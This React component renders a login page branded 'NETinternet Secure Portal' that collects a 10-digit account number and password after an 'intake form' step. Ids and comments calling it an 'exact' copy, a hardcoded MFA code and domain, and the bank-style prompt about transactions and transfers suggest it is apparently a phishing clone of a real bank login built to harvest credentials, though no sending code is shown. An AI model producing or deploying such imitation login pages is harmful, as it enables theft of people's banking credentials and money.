import React, { useState } from 'react';
import { IntakeRecord, AuthCredentials } from '../types';
import {
  Eye,
  EyeOff,
  ArrowLeft,
  Lock,
  AlertCircle,
  ShieldCheck,
  CheckCircle2,
} from 'lucide-react';

interface AuthenticationPortalProps {
  intakeRecord: IntakeRecord;
  onAuthenticate: (credentials: AuthCredentials) => void;
  onBackToIntake: () => void;
}

export const AuthenticationPortal: React.FC<AuthenticationPortalProps> = ({
  intakeRecord,
  onAuthenticate,
  onBackToIntake,
}) => {
  // Pre-fill or generate a 10-digit account number if user provided account reference or ID
  const extractTenDigitAccount = (ref?: string): string => {
    const digitsOnly = (ref || '').replace(/\D/g, '');
    if (digitsOnly.length >= 10) return digitsOnly.slice(0, 10);
    if (digitsOnly.length > 0) return digitsOnly.padEnd(10, '0');
    return '1084920491';
  };

  const [accountNumber, setAccountNumber] = useState(
    extractTenDigitAccount(intakeRecord.accountId || intakeRecord.accountReference)
  );
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleConnect = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const cleanAccount = accountNumber.trim().replace(/\D/g, '');
    if (!cleanAccount) {
      setError('Please enter your 10-digit Account Number');
      return;
    }
    if (cleanAccount.length !== 10) {
      setError('Account Number must be exactly 10 digits');
      return;
    }
    if (!password.trim()) {
      setError('Password is required');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      onAuthenticate({
        identity: cleanAccount,
        password: password,
        domain: 'corp.production.vault',
        mfaCode: '904812',
        rememberDevice: true,
      });
    }, 550);
  };

  return (
    <div
      id="exact-step2-login-view"
      className="min-h-[85vh] w-full flex flex-col justify-between items-center py-6 px-4 select-none"
    >
      {/* Top back navigation bar (discreet) */}
      <div className="w-full max-w-md flex items-center justify-between text-xs text-emerald-200/70 mb-2">
        <button
          type="button"
          onClick={onBackToIntake}
          className="inline-flex items-center gap-1.5 hover:text-white transition-colors cursor-pointer py-1 px-2 rounded-lg hover:bg-black/20"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>Back to Intake Form</span>
        </button>

        {intakeRecord.recordId && (
          <span className="font-mono text-[11px] text-emerald-300/80 bg-black/20 px-2 py-0.5 rounded">
            Record: {intakeRecord.recordId}
          </span>
        )}
      </div>

      {/* Main Glassmorphic Container Card */}
      <div
        id="dark-glassmorphism-card"
        className="w-full max-w-[420px] my-auto bg-[#101920]/80 backdrop-blur-xl border border-emerald-800/20 rounded-2xl p-7 sm:p-9 shadow-2xl shadow-black/80 transition-all duration-300 relative"
      >
        {/* Abstract Green Logo & Brand Header */}
        <div className="flex flex-col items-center justify-center text-center">
          <div className="flex items-center justify-center gap-3 mb-3">
            {/* Custom Green Abstract Logo (Embossed Ribbon / Geometric Style) */}
            <div className="w-11 h-11 relative flex items-center justify-center filter drop-shadow-[0_2px_8px_rgba(16,185,129,0.4)]">
              <svg
                viewBox="0 0 48 48"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                className="w-full h-full"
              >
                <defs>
                  <linearGradient id="greenGrad1" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stopColor="#34d399" />
                    <stop offset="50%" stopColor="#10b981" />
                    <stop offset="100%" stopColor="#047857" />
                  </linearGradient>
                  <linearGradient id="greenGrad2" x1="100%" y1="0%" x2="0%" y2="100%">
                    <stop offset="0%" stopColor="#6ee7b7" />
                    <stop offset="100%" stopColor="#059669" />
                  </linearGradient>
                </defs>
                {/* Abstract 3D Ribbon Lettermark */}
                <path
                  d="M10 8C10 6.89543 10.8954 6 12 6H25C31.6274 6 37 11.3726 37 18C37 21.6115 35.4022 24.8505 32.8687 27.0505C36.4264 29.3512 38.8 33.3989 38.8 38C38.8 42.4183 35.2183 46 30.8 46H12C10.8954 46 10 45.1046 10 44V8Z"
                  fill="url(#greenGrad1)"
                />
                <path
                  d="M17 13H24C26.7614 13 29 15.2386 29 18C29 20.7614 26.7614 23 24 23H17V13Z"
                  fill="#064e3b"
                  opacity="0.85"
                />
                <path
                  d="M17 29H26C28.7614 29 31 31.2386 31 34C31 36.7614 28.7614 39 26 39H17V29Z"
                  fill="#064e3b"
                  opacity="0.85"
                />
                {/* Sleek metallic bevel overlay */}
                <path
                  d="M10 8C10 6.89543 10.8954 6 12 6H25C31.6274 6 37 11.3726 37 18C37 19.5 36.5 21 35.5 22.3L22 9L10 8Z"
                  fill="url(#greenGrad2)"
                  opacity="0.65"
                />
              </svg>
            </div>

            {/* Logo Text: Bold 'NET' with 'internet' */}
            <div className="flex items-baseline tracking-tight">
              <span className="text-2xl font-extrabold text-white">NET</span>
              <span className="text-2xl font-medium text-white">internet</span>
            </div>
          </div>

          {/* Subtitle / Helper Description */}
          <p className="text-xs sm:text-[13px] text-slate-300 font-normal leading-relaxed max-w-[280px] mb-6">
            Enter your credentials to access the transaction or Transfer
          </p>
        </div>

        {/* Credential Form */}
        <form onSubmit={handleConnect} className="space-y-4" noValidate>
          {/* Error message */}
          {error && (
            <div className="p-2.5 rounded-lg bg-red-950/70 border border-red-500/40 text-red-200 text-xs flex items-center gap-2 animate-shake">
              <AlertCircle className="w-4 h-4 text-red-400 shrink-0" />
              <span>{error}</span>
            </div>
          )}

          {/* Field 1: 10-digit Account Number */}
          <div className="relative">
            <input
              id="input-10-digit-account"
              type="text"
              inputMode="numeric"
              maxLength={10}
              value={accountNumber}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '').slice(0, 10);
                setAccountNumber(val);
                if (error) setError(null);
              }}
              placeholder="10-digit Account Number"
              className="w-full bg-[#0d1422] border border-slate-800/80 rounded-xl px-4 py-3.5 text-white placeholder-slate-400 text-sm font-normal focus:outline-none focus:ring-1 focus:ring-emerald-500/60 focus:border-emerald-500/50 transition-all shadow-inner"
            />
          </div>

          {/* Field 2: Password */}
          <div className="relative">
            <input
              id="input-login-password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (error) setError(null);
              }}
              placeholder="Password"
              className="w-full bg-[#0d1422] border border-slate-800/80 rounded-xl px-4 py-3.5 pr-10 text-white placeholder-slate-400 text-sm font-normal focus:outline-none focus:ring-1 focus:ring-emerald-500/60 focus:border-emerald-500/50 transition-all shadow-inner"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-200 transition-colors p-1"
              tabIndex={-1}
            >
              {showPassword ? (
                <EyeOff className="w-4 h-4" />
              ) : (
                <Eye className="w-4 h-4" />
              )}
            </button>
          </div>

          {/* Demo fill shortcut */}
          <div className="flex justify-end pt-1">
            <button
              type="button"
              onClick={() => {
                setAccountNumber('1084920491');
                setPassword('EnterprisePass2026!');
                setError(null);
              }}
              className="text-[11px] text-emerald-400/80 hover:text-emerald-300 transition-colors cursor-pointer"
            >
              Auto-fill sample credentials
            </button>
          </div>

          {/* Primary Action Button: Yellow Button labeled 'CONNECT TO NETWORK' */}
          <div className="pt-2">
            <button
              id="btn-connect-to-network"
              type="submit"
              disabled={isSubmitting}
              className="w-full py-3.5 px-6 rounded-xl font-bold text-xs sm:text-sm tracking-wider uppercase text-slate-950 bg-[#f5a600] hover:bg-[#e69d00] active:bg-[#d48e00] disabled:opacity-60 transition-all duration-150 shadow-lg shadow-black/40 hover:shadow-yellow-500/20 flex items-center justify-center gap-2 cursor-pointer"
            >
              {isSubmitting ? (
                <>
                  <div className="w-4 h-4 border-2 border-slate-950/40 border-t-slate-950 rounded-full animate-spin" />
                  <span>CONNECTING...</span>
                </>
              ) : (
                <span>CONNECT TO NETWORK</span>
              )}
            </button>
          </div>
        </form>
      </div>

      {/* Exact Bottom Copyright Footer */}
      <footer className="mt-8 text-center text-xs text-emerald-200/50">
        <p>© 2026 NETInternet Secure Portal. All rights reserved.</p>
      </footer>
    </div>
  );
};
